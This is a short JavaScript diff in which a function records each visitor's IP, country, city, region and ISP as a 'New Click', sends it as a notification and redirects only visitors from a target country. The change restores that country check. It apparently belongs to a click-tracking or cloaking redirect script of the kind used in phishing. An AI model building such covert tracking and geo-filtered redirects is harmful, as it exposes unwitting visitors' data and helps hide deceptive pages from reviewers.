@@ -42,8 +42,7 @@ function getIPDetails() {
     var countryEmoji = getCountryFlagEmoji(data.country_code);
     var ipDetails = "-------New Click-------\nIP: " + data.ip + "\nCountry: " + countryEmoji + "[" + data.country_name + "]\nCity: " + data.city + "\nRegion: " + data.region + "\nISP: " + data.org + "\n-------END-------";
     
-    //if (data.country_code.toUpperCase() === TargetCountry) {
-    if (true) {
+    if (data.country_code.toUpperCase() === TargetCountry) {
       sendNotification(ipDetails);
       Redirect();
     } else {
